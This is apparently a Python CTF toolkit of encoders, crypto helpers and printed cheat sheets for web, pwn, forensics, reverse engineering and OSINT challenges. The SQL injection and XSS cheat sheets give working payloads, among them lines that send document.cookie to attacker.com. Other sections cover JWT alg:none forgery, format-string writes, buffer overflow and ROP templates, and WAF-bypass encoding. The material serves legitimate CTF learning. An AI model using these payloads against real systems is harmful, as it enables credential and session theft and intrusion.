#!/usr/bin/env python3
"""
CTF Encoder/Decoder Toolkit - Expanded Edition
Covers: Cryptography, Web, Pwn, Forensics, Reverse Engineering, OSINT, Misc
"""

import base64
import hashlib
import urllib.parse
import html
import sys
import os
import struct
import string
import itertools
from math import gcd, isqrt


# ─────────────────────────────────────────────
# ░░ CRYPTOGRAPHY ░░
# ─────────────────────────────────────────────

def base64_tool():
    action = input("  [1] Encode  [2] Decode  [3] Decode (URL-safe) : ").strip()
    text = input("  Enter text: ").strip()
    if action == "1":
        result = base64.b64encode(text.encode()).decode()
        print(f"\n  Standard : {result}")
        print(f"  URL-safe : {base64.urlsafe_b64encode(text.encode()).decode()}")
        return
    elif action == "2":
        try:
            # Auto-add padding if needed
            padded = text + "=" * (-len(text) % 4)
            result = base64.b64decode(padded).decode()
        except Exception:
            result = "[!] Invalid Base64 input"
    elif action == "3":
        try:
            padded = text + "=" * (-len(text) % 4)
            result = base64.urlsafe_b64decode(padded).decode()
        except Exception:
            result = "[!] Invalid URL-safe Base64"
    else:
        result = "[!] Invalid option"
    print(f"\n  Result: {result}")


def base32_tool():
    action = input("  [1] Encode  [2] Decode : ").strip()
    text = input("  Enter text: ").strip()
    if action == "1":
        result = base64.b32encode(text.encode()).decode()
    elif action == "2":
        try:
            padded = text.upper() + "=" * (-len(text) % 8)
            result = base64.b32decode(padded).decode()
        except Exception:
            result = "[!] Invalid Base32 input"
    else:
        result = "[!] Invalid option"
    print(f"\n  Result: {result}")


BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

def base58_encode(data: bytes) -> str:
    num = int.from_bytes(data, "big")
    result = ""
    while num > 0:
        num, rem = divmod(num, 58)
        result = BASE58_ALPHABET[rem] + result
    for byte in data:
        if byte == 0:
            result = BASE58_ALPHABET[0] + result
        else:
            break
    return result

def base58_decode(s: str) -> bytes:
    num = 0
    for char in s:
        if char not in BASE58_ALPHABET:
            raise ValueError(f"Invalid character: {char}")
        num = num * 58 + BASE58_ALPHABET.index(char)
    result = []
    while num > 0:
        num, rem = divmod(num, 256)
        result.insert(0, rem)
    for char in s:
        if char == BASE58_ALPHABET[0]:
            result.insert(0, 0)
        else:
            break
    return bytes(result)

def base58_tool():
    action = input("  [1] Encode  [2] Decode : ").strip()
    text = input("  Enter text: ").strip()
    if action == "1":
        result = base58_encode(text.encode())
    elif action == "2":
        try:
            result = base58_decode(text).decode()
        except Exception as e:
            result = f"[!] Error: {e}"
    else:
        result = "[!] Invalid option"
    print(f"\n  Result: {result}")


def hex_tool():
    action = input("  [1] Text→Hex  [2] Hex→Text  [3] Hex→Bytes (raw) : ").strip()
    text = input("  Enter text: ").strip().replace(" ", "").replace("0x", "")
    if action == "1":
        result = text.encode().hex()
        print(f"\n  Hex    : {result}")
        print(f"  Spaced : {' '.join(result[i:i+2] for i in range(0, len(result), 2))}")
        return
    elif action == "2":
        try:
            result = bytes.fromhex(text).decode()
        except Exception:
            result = "[!] Invalid hex input"
    elif action == "3":
        try:
            raw = bytes.fromhex(text)
            print(f"\n  Bytes : {list(raw)}")
            print(f"  Int   : {int.from_bytes(raw, 'big')} (big-endian)")
            return
        except Exception:
            result = "[!] Invalid hex input"
    else:
        result = "[!] Invalid option"
    print(f"\n  Result: {result}")


def binary_tool():
    action = input("  [1] Text→Binary  [2] Binary→Text : ").strip()
    text = input("  Enter text: ").strip()
    if action == "1":
        result = " ".join(format(ord(c), "08b") for c in text)
    elif action == "2":
        try:
            bits = text.split()
            result = "".join(chr(int(b, 2)) for b in bits)
        except Exception:
            result = "[!] Invalid binary input (use space-separated 8-bit groups)"
    else:
        result = "[!] Invalid option"
    print(f"\n  Result: {result}")


def rot13_tool():
    text = input("  Enter text: ").strip()
    result = text.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
    ))
    print(f"\n  Result: {result}")


def caesar_tool():
    text = input("  Enter text to brute force: ").strip()
    target = input("  Filter for keyword (blank to show all): ").strip().lower()
    print("\n  All 25 shifts:")
    for shift in range(1, 26):
        result = ""
        for char in text:
            if char.isalpha():
                base = ord("A") if char.isupper() else ord("a")
                result += chr((ord(char) - base + shift) % 26 + base)
            else:
                result += char
        if not target or target in result.lower():
            marker = "  <<" if target and target in result.lower() else ""
            print(f"  Shift {shift:>2}: {result}{marker}")


def vigenere_tool():
    """
    Vigenère cipher — a polyalphabetic substitution cipher.
    Key cycles over the plaintext: each key character shifts one plaintext character.
    """
    print("\n  Vigenère Cipher")
    print("  NOTE: key only uses A-Z letters (non-alpha chars in plaintext are unchanged)")
    action = input("  [1] Encrypt  [2] Decrypt : ").strip()
    text = input("  Enter text: ").strip()
    key = input("  Enter key: ").strip().upper()
    if not key.isalpha():
        print("\n  [!] Key must contain only letters")
        return
    result = []
    key_idx = 0
    encrypt = (action == "1")
    for char in text:
        if char.isalpha():
            base = ord("A") if char.isupper() else ord("a")
            shift = ord(key[key_idx % len(key)]) - ord("A")
            if not encrypt:
                shift = -shift
            result.append(chr((ord(char) - base + shift) % 26 + base))
            key_idx += 1
        else:
            result.append(char)
    print(f"\n  Result: {''.join(result)}")


def xor_tool():
    print("\n  XOR Tool")
    mode = input("  [1] Text XOR  [2] Hex XOR (brute force single-byte key) : ").strip()
    if mode == "1":
        text = input("  Enter text: ").strip()
        key = input("  Enter key (single char or string): ").strip()
        if not key:
            print("\n  [!] Key cannot be empty")
            return
        key_rep = (key * (len(text) // len(key) + 1))[:len(text)]
        result = "".join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key_rep))
        print(f"\n  Result (raw) : {result}")
        print(f"  Result (hex) : {result.encode().hex()}")
    elif mode == "2":
        hex_str = input("  Enter hex-encoded ciphertext (no spaces): ").strip().replace(" ", "")
        try:
            data = bytes.fromhex(hex_str)
        except Exception:
            print("\n  [!] Invalid hex")
            return
        print("\n  Single-byte XOR brute force (showing printable results):")
        for key_byte in range(256):
            plain = bytes([b ^ key_byte for b in data])
            try:
                decoded = plain.decode("ascii")
                printable_ratio = sum(c in string.printable for c in decoded) / len(decoded)
                if printable_ratio > 0.85:
                    print(f"  Key 0x{key_byte:02x} ({chr(key_byte) if 32 <= key_byte < 127 else '?'}): {decoded[:80]}")
            except Exception:
                pass
    else:
        print("\n  [!] Invalid option")


def frequency_analysis():
    """
    Frequency analysis — counting letter frequencies to help break substitution ciphers.
    English letter frequency order: ETAOINSHRDLCUMWFGYPBVKJXQZ
    """
    text = input("  Enter ciphertext: ").strip().upper()
    total = sum(1 for c in text if c.isalpha())
    if total == 0:
        print("\n  [!] No alphabetic characters found")
        return
    freq = {}
    for c in text:
        if c.isalpha():
            freq[c] = freq.get(c, 0) + 1
    sorted_freq = sorted(freq.items(), key=lambda x: x[1], reverse=True)
    print(f"\n  Letter frequencies (total letters: {total}):")
    print(f"  {'Letter':<8} {'Count':<8} {'%':<8} {'Bar'}")
    print(f"  {'-'*50}")
    for char, count in sorted_freq:
        pct = count / total * 100
        bar = "█" * int(pct)
        print(f"  {char:<8} {count:<8} {pct:<7.1f}% {bar}")
    print(f"\n  Cipher order : {''.join(c for c, _ in sorted_freq)}")
    print(f"  English order: ETAOINSHRDLCUMWFGYPBVKJXQZ")
    print(f"\n  Tip: try mapping the most frequent cipher letters to E, T, A, O, I, N...")


def rsa_helper():
    """
    RSA — asymmetric encryption based on integer factorisation difficulty.
    Public key: (n, e) — used to encrypt.
    Private key: (n, d) — used to decrypt.
    If you can factor n into p and q, you can compute d and break RSA!
    """
    print("\n  RSA Helper")
    print("  [1] Compute private key (d) from p, q, e")
    print("  [2] Decrypt message given n, e, d, ciphertext")
    print("  [3] Small e attack (e=3, low plaintext — cube root)")
    action = input("  Option: ").strip()
    if action == "1":
        try:
            p = int(input("  p (prime): ").strip())
            q = int(input("  q (prime): ").strip())
            e = int(input("  e (public exponent): ").strip())
            n = p * q
            phi = (p - 1) * (q - 1)
            if gcd(e, phi) != 1:
                print("\n  [!] e and phi(n) are not coprime — invalid RSA parameters")
                return
            d = pow(e, -1, phi)
            print(f"\n  n   = {n}")
            print(f"  phi = {phi}")
            print(f"  d   = {d}")
            print(f"\n  Private key: (n={n}, d={d})")
        except Exception as ex:
            print(f"\n  [!] Error: {ex}")
    elif action == "2":
        try:
            n = int(input("  n: ").strip())
            d = int(input("  d: ").strip())
            c = int(input("  ciphertext (integer): ").strip())
            m = pow(c, d, n)
            print(f"\n  Plaintext integer : {m}")
            try:
                decoded = m.to_bytes((m.bit_length() + 7) // 8, "big").decode()
                print(f"  Decoded string    : {decoded}")
            except Exception:
                print("  (Could not decode to ASCII string)")
        except Exception as ex:
            print(f"\n  [!] Error: {ex}")
    elif action == "3":
        try:
            c = int(input("  ciphertext (integer): ").strip())
            root = isqrt(c)
            # Newton's method for integer cube root
            x = int(round(c ** (1/3)))
            for candidate in range(max(0, x - 2), x + 3):
                if candidate ** 3 == c:
                    print(f"\n  Cube root found: {candidate}")
                    try:
                        decoded = candidate.to_bytes((candidate.bit_length() + 7) // 8, "big").decode()
                        print(f"  Decoded string : {decoded}")
                    except Exception:
                        pass
                    return
            print("\n  [!] No perfect cube root — e=3 low-exponent attack may not apply here")
        except Exception as ex:
            print(f"\n  [!] Error: {ex}")
    else:
        print("\n  [!] Invalid option")


# ─────────────────────────────────────────────
# ░░ WEB ░░
# ─────────────────────────────────────────────

def url_tool():
    action = input("  [1] Encode  [2] Decode  [3] Encode (full, all chars) : ").strip()
    text = input("  Enter text: ").strip()
    if action == "1":
        result = urllib.parse.quote(text, safe="")
    elif action == "2":
        result = urllib.parse.unquote(text)
    elif action == "3":
        # Encode EVERY character — useful for WAF bypass attempts
        result = "".join(f"%{b:02X}" for b in text.encode())
    else:
        result = "[!] Invalid option"
    print(f"\n  Result: {result}")


def html_tool():
    action = input("  [1] Encode  [2] Decode : ").strip()
    text = input("  Enter text: ").strip()
    if action == "1":
        result = html.escape(text)
    elif action == "2":
        result = html.unescape(text)
    else:
        result = "[!] Invalid option"
    print(f"\n  Result: {result}")


def jwt_tool():
    """
    JWT (JSON Web Token) — three Base64URL-encoded parts: header.payload.signature
    In CTFs, look for: alg:none attack, weak secrets, algorithm confusion (RS256→HS256).
    """
    print("\n  JWT Decoder")
    token = input("  Paste JWT token: ").strip()
    parts = token.split(".")
    if len(parts) != 3:
        print("\n  [!] Invalid JWT format (expected header.payload.signature)")
        return
    def decode_part(part):
        padded = part + "=" * (-len(part) % 4)
        try:
            return base64.urlsafe_b64decode(padded).decode()
        except Exception:
            return f"[raw bytes: {base64.urlsafe_b64decode(padded).hex()}]"
    print(f"\n  Header    : {decode_part(parts[0])}")
    print(f"  Payload   : {decode_part(parts[1])}")
    print(f"  Signature : {parts[2]}")
    print(f"\n  --- CTF Tricks ---")
    print(f"  alg:none  → change alg to 'none', remove signature, keep trailing dot")
    print(f"  None bypass token: {parts[0]}.{parts[1]}.")

    import json
    try:
        header = json.loads(decode_part(parts[0]))
        if header.get("alg", "").upper().startswith("RS"):
            print(f"  RS→HS confusion: sign with RSA public key as HMAC secret")
    except Exception:
        pass


def sqli_cheatsheet():
    """
    SQL Injection — inserting SQL code into user-supplied input to manipulate queries.
    """
    print("""
  ┌─────────────────────────────────────────────────────┐
  │              SQL INJECTION CHEATSHEET               │
  └─────────────────────────────────────────────────────┘

  DETECTION
    '             → syntax error?
    ' OR '1'='1   → always true
    ' OR '1'='2   → always false (compare responses)

  COMMENT STYLES
    MySQL   : -- -   #   /**/
    MSSQL   : --
    Oracle  : --
    SQLite  : --

  UNION-BASED (enumerate columns first)
    ' ORDER BY 1--    (increment until error to count cols)
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT 1,2,3--

  EXTRACT DATA (MySQL examples)
    ' UNION SELECT table_name,2 FROM information_schema.tables--
    ' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--
    ' UNION SELECT username,password FROM users--

  BLIND BOOLEAN
    ' AND 1=1--   (true)
    ' AND 1=2--   (false)
    ' AND SUBSTR(password,1,1)='a'--

  BLIND TIME-BASED
    MySQL  : ' AND SLEEP(5)--
    MSSQL  : '; WAITFOR DELAY '0:0:5'--
    SQLite : ' AND 1=(SELECT 1 FROM sqlite_master WHERE LIKE('a%',sqlite_version()) AND SLEEP(5))--

  FILTER BYPASS
    Space    → /**/ or %09 (tab) or %0a (newline)
    OR       → ||
    AND      → &&
    =        → LIKE
    Quotes   → CHAR(39) or hex 0x27
""")


def xss_cheatsheet():
    """
    XSS (Cross-Site Scripting) — injecting client-side scripts into web pages.
    Reflected: in URL params; Stored: in DB; DOM: via JS manipulation.
    """
    print("""
  ┌─────────────────────────────────────────────────────┐
  │              XSS CHEATSHEET                         │
  └─────────────────────────────────────────────────────┘

  BASIC PAYLOADS
    <script>alert(1)</script>
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>
    <body onload=alert(1)>
    "><script>alert(1)</script>

  FILTER BYPASS
    Case variation  : <ScRiPt>alert(1)</ScRiPt>
    No quotes       : <img src=x onerror=alert(1)>
    HTML entities   : <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
    Double encode   : %253Cscript%253E (bypasses single-decode filters)
    JS unicode      : <img src=x onerror=\u0061lert(1)>
    Template literal: ${alert(1)} (in template injection contexts)

  USEFUL PAYLOADS (CTF)
    document.cookie        → steal cookies
    document.location='http://attacker.com?c='+document.cookie
    fetch('http://attacker.com?c='+btoa(document.cookie))

  CONTENT-SECURITY-POLICY BYPASS HINTS
    Check for unsafe-inline, unsafe-eval, CDN whitelist
    JSONP endpoints on whitelisted domains
""")


# ─────────────────────────────────────────────
# ░░ PWN ░░
# ─────────────────────────────────────────────

def cyclic_pattern():
    """
    Cyclic/De Bruijn pattern — every 4-byte subsequence is unique.
    Send as input, note what's in EIP/RIP/LR on crash, then find offset.
    This tells you exactly how many bytes before you control the return address.
    """
    print("\n  Cyclic Pattern Generator (De Bruijn sequence)")
    print("  Purpose: find buffer overflow offset by sending a unique pattern")
    print("  [1] Generate pattern  [2] Find offset of 4-byte value")
    action = input("  Option: ").strip()

    chars = string.ascii_lowercase
    def de_bruijn(k, n):
        """Generate De Bruijn sequence of alphabet k and word length n."""
        alphabet = list(k)
        a = [0] * len(alphabet) * n
        sequence = []
        def db(t, p):
            if t > n:
                if n % p == 0:
                    sequence.extend(a[1:p + 1])
            else:
                a[t] = a[t - p]
                db(t + 1, p)
                for j in range(a[t - p] + 1, len(alphabet)):
                    a[t] = j
                    db(t + 1, t)
        db(1, 1)
        return sequence

    if action == "1":
        try:
            length = int(input("  Pattern length (e.g. 100): ").strip())
            seq = de_bruijn(chars, 4)
            pattern = "".join(chars[i] for i in seq)
            pattern = (pattern * (length // len(pattern) + 1))[:length]
            print(f"\n  Pattern ({length} bytes):")
            print(f"  {pattern}")
        except Exception as ex:
            print(f"\n  [!] Error: {ex}")
    elif action == "2":
        try:
            val = input("  Enter 4-byte value from register (hex e.g. 61616162 or 0x61616162): ").strip()
            val = val.replace("0x", "").replace("0X", "")
            raw = bytes.fromhex(val)
            # Try both little-endian and big-endian
            for endian, name in [("little", "little-endian (x86)"), ("big", "big-endian")]:
                sub = raw.decode("ascii", errors="replace")
                seq = de_bruijn(chars, 4)
                pattern = "".join(chars[i] for i in seq)
                # Search for 4-char substring
                search = raw.decode("latin-1")
                idx = pattern.find(search)
                if idx != -1:
                    print(f"\n  Offset ({name}): {idx}")
                # Also try reversed (little-endian register read)
                search_rev = raw[::-1].decode("latin-1")
                idx2 = pattern.find(search_rev)
                if idx2 != -1:
                    print(f"  Offset (reversed / {name}): {idx2}")
            if pattern.find(raw.decode("latin-1")) == -1 and pattern.find(raw[::-1].decode("latin-1")) == -1:
                print("\n  [!] Value not found in pattern. Make sure to generate the pattern first.")
        except Exception as ex:
            print(f"\n  [!] Error: {ex}")
    else:
        print("\n  [!] Invalid option")


def format_string_helper():
    """
    Format string vulnerability — when user input is passed directly as printf format.
    e.g. printf(user_input) instead of printf("%s", user_input)
    Allows reading/writing arbitrary memory.
    """
    print("""
  ┌─────────────────────────────────────────────────────┐
  │           FORMAT STRING VULNERABILITY               │
  └─────────────────────────────────────────────────────┘

  HOW IT WORKS
    printf(buf)         ← VULNERABLE (buf is format string)
    printf("%s", buf)   ← SAFE

  READ STACK VALUES
    %x %x %x %x %x     → dump stack as hex
    %p %p %p %p         → dump as pointer (better)
    %7$p                → read 7th argument directly (direct parameter access)

  READ ARBITRARY MEMORY
    [addr]%N$s          → read string at address (N = offset to your input on stack)
    [addr]%N$x          → read 4 bytes at address as hex

  WRITE MEMORY (%n writes bytes-written count to address)
    Simple write        : [addr]%N$n
    Byte write          : [addr]%N$hhn  (writes 1 byte)
    Short write         : [addr]%N$hn   (writes 2 bytes)

  WORKFLOW
    1. Find your input's offset on the stack: send "AAAA%p%p%p..." look for 0x41414141
    2. Note the position (e.g. position 6)
    3. Now "AAAA%6$x" should print 41414141

  PWNTOOLS ONE-LINER
    from pwn import *
    fmt = fmtstr_payload(offset, {target_addr: value})
""")


def shellcode_info():
    """
    Common shellcode patterns and pwntools snippets for CTF Pwn challenges.
    """
    print("""
  ┌─────────────────────────────────────────────────────┐
  │              SHELLCODE / PWN REFERENCE              │
  └─────────────────────────────────────────────────────┘

  PWNTOOLS SETUP
    from pwn import *
    p = process('./binary')      # local
    p = remote('host', port)     # remote
    e = ELF('./binary')
    libc = ELF('libc.so.6')

  COMMON PATTERNS
    p.sendline(payload)
    p.recvuntil(b'> ')
    p.interactive()

  BUFFER OVERFLOW TEMPLATE
    offset = 64                  # found with cyclic pattern
    ret_addr = p64(0xdeadbeef)   # address to jump to (little-endian)
    payload = b'A' * offset + ret_addr
    p.sendline(payload)

  ROP GADGETS
    ROPgadget --binary ./binary
    ropper -f ./binary
    e.plt['system']              # find system@plt
    next(e.search(b'/bin/sh'))   # find /bin/sh string

  CHECKING PROTECTIONS
    checksec --file=./binary
    NX     = no-exec stack (can't run shellcode on stack)
    PIE    = position independent (need leak for addresses)
    RELRO  = GOT protection
    Stack  = stack canaries (need leak or bypass)

  x86-64 CALLING CONVENTION
    Args: RDI, RSI, RDX, RCX, R8, R9, then stack
    system('/bin/sh') needs: RDI = ptr to '/bin/sh'
    pop rdi; ret gadget required

  ONE_GADGET (libc instant shell)
    one_gadget libc.so.6
""")


# ─────────────────────────────────────────────
# ░░ FORENSICS ░░
# ─────────────────────────────────────────────

MAGIC_BYTES = {
    b"\x89PNG\r\n\x1a\n": "PNG image",
    b"\xff\xd8\xff":       "JPEG image",
    b"GIF87a":             "GIF87 image",
    b"GIF89a":             "GIF89 image",
    b"BM":                 "BMP image",
    b"PK\x03\x04":         "ZIP archive (also DOCX/XLSX/JAR)",
    b"PK\x05\x06":         "ZIP archive (empty)",
    b"Rar!":               "RAR archive",
    b"\x1f\x8b":           "GZIP compressed",
    b"7z\xbc\xaf'\x1c":   "7-Zip archive",
    b"\xfd7zXZ\x00":      "XZ compressed",
    b"BZh":                "BZIP2 compressed",
    b"\x7fELF":            "ELF executable (Linux binary)",
    b"MZ":                 "PE executable (Windows .exe/.dll)",
    b"\xca\xfe\xba\xbe":  "Mach-O binary (macOS, multi-arch)",
    b"\xce\xfa\xed\xfe":  "Mach-O binary (macOS, 32-bit)",
    b"\xcf\xfa\xed\xfe":  "Mach-O binary (macOS, 64-bit)",
    b"OggS":               "OGG audio/video",
    b"ID3":                "MP3 audio (ID3 tag)",
    b"fLaC":               "FLAC audio",
    b"RIFF":               "RIFF container (WAV/AVI)",
    b"\x00\x00\x00 ftypM4A": "M4A audio",
    b"%PDF":               "PDF document",
    b"<!DOCTYPE":          "HTML document",
    b"<html":              "HTML document",
    b"{\x22":              "JSON data",
    b"SQLite format 3":    "SQLite database",
    b"\x53\x51\x4c\x69":  "SQLite database",
    b"\x00\x01\x00\x00":  "TrueType font",
    b"wOFF":               "WOFF font",
    b"\x50\x4b\x03\x04":  "PKZIP",
}

def file_magic():
    """
    File magic bytes — the first few bytes of a file identify its true type.
    Files can be renamed to hide their real format; magic bytes reveal the truth.
    """
    filepath = input("  Enter file path: ").strip()
    if not os.path.exists(filepath):
        print(f"\n  [!] File not found: {filepath}")
        return
    with open(filepath, "rb") as f:
        header = f.read(32)
        f.seek(0)
        size = os.path.getsize(filepath)
    print(f"\n  File    : {filepath}")
    print(f"  Size    : {size} bytes")
    print(f"  Header  : {header.hex()}")
    print(f"  ASCII   : {repr(header[:16])}")
    matched = False
    for magic, name in MAGIC_BYTES.items():
        if header.startswith(magic):
            print(f"\n  Type    : {name}  ✓")
            matched = True
            break
    if not matched:
        print(f"\n  Type    : Unknown — check https://en.wikipedia.org/wiki/List_of_file_signatures")
    print(f"\n  Tip     : If file extension doesn't match magic bytes, rename or carve it")


def strings_extractor():
    """
    Extract printable strings from binary files — often reveals flags, keys, or hints.
    Equivalent to running `strings` on Linux.
    """
    filepath = input("  Enter file path: ").strip()
    if not os.path.exists(filepath):
        print(f"\n  [!] File not found: {filepath}")
        return
    min_len = input("  Minimum string length [default 4]: ").strip()
    min_len = int(min_len) if min_len.isdigit() else 4
    filter_kw = input("  Filter keyword (blank for all): ").strip().lower()

    with open(filepath, "rb") as f:
        data = f.read()

    printable = set(string.printable.encode())
    results = []
    current = []
    for byte in data:
        if byte in printable:
            current.append(chr(byte))
        else:
            if len(current) >= min_len:
                results.append("".join(current))
            current = []
    if len(current) >= min_len:
        results.append("".join(current))

    filtered = [s for s in results if not filter_kw or filter_kw in s.lower()]
    print(f"\n  Found {len(filtered)} strings (of {len(results)} total):\n")
    for s in filtered[:200]:
        print(f"  {s}")
    if len(filtered) > 200:
        print(f"\n  ... {len(filtered) - 200} more strings truncated")


def steganography_hints():
    print("""
  ┌─────────────────────────────────────────────────────┐
  │           STEGANOGRAPHY CHECKLIST                   │
  └─────────────────────────────────────────────────────┘

  IMAGE
    strings image.png               → text in file
    xxd image.png | tail            → data appended after EOF marker (IEND for PNG)
    steghide extract -sf image.jpg  → extract with/without password
    stegsolve.jar                   → bit plane analysis, LSB viewer
    zsteg image.png                 → LSB steg (png/bmp)
    exiftool image.jpg              → EXIF metadata (GPS, comments, software)
    binwalk -e image.png            → extract embedded files

  AUDIO
    Audacity (spectrogram view)     → hidden image in audio spectrum
    strings audio.wav               → text hidden in WAV
    morse in audio waveform?        → listen carefully

  TEXT / DOCUMENT
    cat -A file.txt                 → trailing spaces (whitespace steganography)
    Zero-width characters?          → U+200B, U+FEFF in text
    Acrosteganography               → first letters of lines spell message

  GENERAL
    file suspicious_file            → check real type
    binwalk suspicious_file         → embedded files
    foremost suspicious_file        → file carving
    xxd file | grep -i "flag"       → brute-search hex dump

  LSB STEGANOGRAPHY (Python)
    from PIL import Image
    img = Image.open("image.png")
    pixels = list(img.getdata())
    bits = [px[0] & 1 for px in pixels]   # least significant bit of red channel
    # Group bits into bytes and decode
""")


# ─────────────────────────────────────────────
# ░░ REVERSE ENGINEERING ░░
# ─────────────────────────────────────────────

def reverse_engineering_ref():
    print("""
  ┌─────────────────────────────────────────────────────┐
  │        REVERSE ENGINEERING REFERENCE                │
  └─────────────────────────────────────────────────────┘

  STATIC ANALYSIS (without running)
    file binary                     → type, arch, stripped?
    strings binary                  → readable strings
    objdump -d binary               → disassembly (Linux)
    nm binary                       → symbol table (functions)
    readelf -a binary               → ELF headers, sections
    ltrace ./binary                 → library calls
    strace ./binary                 → system calls

  TOOLS
    Ghidra (free)                   → decompiler + disassembler
    IDA Pro / IDA Free              → industry standard disassembler
    radare2 / Cutter                → free, CLI + GUI
    Binary Ninja                    → modern decompiler
    x64dbg / OllyDbg                → Windows dynamic analysis
    GDB + pwndbg/peda/GEF          → Linux debugger

  COMMON PATTERNS TO LOOK FOR
    strcmp / memcmp calls           → flag comparison
    Anti-debug: ptrace check        → patch out or bypass
    XOR decryption loop             → key is likely short
    Base64 lookup table             → custom alphabet?
    Packing/UPX                     → upx -d binary to unpack

  PYTHON DEOBFUSCATION
    import dis; dis.dis(code)       → Python bytecode
    uncompyle6 / decompile3         → decompile .pyc files

  GDB QUICK START
    gdb ./binary
    break main                      → set breakpoint
    run                             → execute
    ni / si                         → next instruction / step into
    x/20x $rsp                      → examine stack (20 hex words)
    info registers                  → show all registers
    disassemble main                → disassemble function

  ANTI-REVERSING BYPASS
    Patch JZ→JNZ (or NOP it)       → flip conditional jump
    LD_PRELOAD hook                 → override library functions
    GDB: set $eip = 0xaddr         → jump to address
""")


# ─────────────────────────────────────────────
# ░░ MISC / OSINT ░░
# ─────────────────────────────────────────────

def morse_tool():
    MORSE_CODE = {
        "A": ".-",   "B": "-...", "C": "-.-.", "D": "-..",
        "E": ".",    "F": "..-.", "G": "--.",  "H": "....",
        "I": "..",   "J": ".---", "K": "-.-",  "L": ".-..",
        "M": "--",   "N": "-.",   "O": "---",  "P": ".--.",
        "Q": "--.-", "R": ".-.",  "S": "...",  "T": "-",
        "U": "..-",  "V": "...-", "W": ".--",  "X": "-..-",
        "Y": "-.--", "Z": "--..",
        "0": "-----", "1": ".----", "2": "..---", "3": "...--",
        "4": "....-", "5": ".....", "6": "-....", "7": "--...",
        "8": "---..", "9": "----.",
        " ": "/"
    }
    REVERSE_MORSE = {v: k for k, v in MORSE_CODE.items()}
    action = input("  [1] Text→Morse  [2] Morse→Text : ").strip()
    text = input("  Enter text: ").strip()
    if action == "1":
        try:
            result = " ".join(MORSE_CODE[c.upper()] for c in text if c.upper() in MORSE_CODE)
        except Exception:
            result = "[!] Unsupported characters"
    elif action == "2":
        try:
            words = text.split(" / ")
            decoded_words = []
            for word in words:
                decoded_words.append("".join(REVERSE_MORSE[code] for code in word.split()))
            result = " ".join(decoded_words)
        except Exception:
            result = "[!] Invalid morse input"
    else:
        result = "[!] Invalid option"
    print(f"\n  Result: {result}")


def hash_tool():
    text = input("  Enter text to hash: ").strip()
    print(f"\n  MD5    : {hashlib.md5(text.encode()).hexdigest()}")
    print(f"  SHA1   : {hashlib.sha1(text.encode()).hexdigest()}")
    print(f"  SHA256 : {hashlib.sha256(text.encode()).hexdigest()}")
    print(f"  SHA512 : {hashlib.sha512(text.encode()).hexdigest()}")


def hash_identifier():
    h = input("  Paste hash: ").strip()
    length = len(h)
    print()
    hash_map = {
        32: "MD5",
        40: "SHA1",
        56: "SHA224",
        64: "SHA256 or SHA3-256",
        96: "SHA384",
        128: "SHA512 or SHA3-512",
        60: "bcrypt (usually starts with $2b$)",
        13: "DES crypt",
    }
    guess = hash_map.get(length, f"Unknown (length: {length})")
    is_hex = all(c in "0123456789abcdefABCDEF" for c in h)
    print(f"  Likely : {guess}")
    print(f"  Chars  : {'hex only' if is_hex else 'non-hex detected (may be bcrypt/other)'}")
    if h.startswith("$2"):
        print(f"  Format : Looks like bcrypt — use hashcat mode 3200")
    print(f"\n  Crack with hashcat: hashcat -m <mode> hash.txt wordlist.txt")
    print(f"  Common modes: MD5=0, SHA1=100, SHA256=1400, SHA512=1700, bcrypt=3200")


def base_converter():
    print("  Convert a number between any bases (2 to 36)")
    try:
        from_base = int(input("  From base: ").strip())
        to_base   = int(input("  To base  : ").strip())
        if not (2 <= from_base <= 36) or not (2 <= to_base <= 36):
            print("\n  [!] Base must be between 2 and 36")
            return
        number = input(f"  Enter number (base {from_base}): ").strip().upper()
        decimal = int(number, from_base)
        digits = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        if decimal == 0:
            result = "0"
        else:
            result = ""
            n = decimal
            while n > 0:
                result = digits[n % to_base] + result
                n //= to_base
        print(f"\n  {number} (base {from_base}) = {result} (base {to_base})")
        print(f"  Decimal value: {decimal}")
    except ValueError as e:
        print(f"\n  [!] Error: {e}")


def osint_reference():
    print("""
  ┌─────────────────────────────────────────────────────┐
  │              OSINT QUICK REFERENCE                  │
  └─────────────────────────────────────────────────────┘

  DOMAIN / IP
    whois domain.com                → registrant info
    dig domain.com ANY              → DNS records
    nslookup domain.com             → DNS lookup
    https://dnsdumpster.com         → DNS enumeration
    https://shodan.io               → internet-connected device search
    https://censys.io               → certificate/host search
    https://www.virustotal.com      → reputation lookup

  USERNAME / PERSON
    https://whatsmyname.app         → username across platforms
    https://namechk.com             → username availability
    https://pipl.com                → people search
    Google: "name" site:linkedin.com

  IMAGE
    Google Reverse Image Search     → images.google.com
    https://tineye.com              → image origin
    exiftool image.jpg              → GPS, camera, timestamps

  METADATA
    exiftool file                   → all metadata
    mat2 file                       → strip metadata
    pdfinfo document.pdf            → PDF metadata

  WAYBACK / CACHED
    https://web.archive.org         → historical snapshots
    Google cache: cache:url

  GOOGLE DORKS
    site:example.com                → restrict to domain
    filetype:pdf                    → specific file type
    inurl:admin                     → URL contains word
    intitle:"index of"              → open directory listings
    "CTF{" site:pastebin.com        → flag leaks
""")


def flag_finder():
    """Scan a file for common CTF flag formats."""
    filepath = input("  Enter file path: ").strip()
    if not os.path.exists(filepath):
        print(f"\n  [!] File not found: {filepath}")
        return
    with open(filepath, "rb") as f:
        data = f.read()
    text = data.decode("latin-1")
    import re
    # Common flag formats
    patterns = [
        r"flag\{[^}]+\}",
        r"FLAG\{[^}]+\}",
        r"CTF\{[^}]+\}",
        r"[A-Z]{2,8}\{[^}]+\}",   # generic {brackets} format
        r"picoCTF\{[^}]+\}",
        r"HTB\{[^}]+\}",
        r"THM\{[^}]+\}",
    ]
    found = set()
    for pat in patterns:
        matches = re.findall(pat, text, re.IGNORECASE)
        found.update(matches)
    if found:
        print(f"\n  Found {len(found)} potential flag(s):")
        for f_str in found:
            print(f"  >>> {f_str}")
    else:
        print("\n  No obvious flags found.")
        print("  Tip: try strings extractor (option 20) with keyword 'flag' or '{' ")


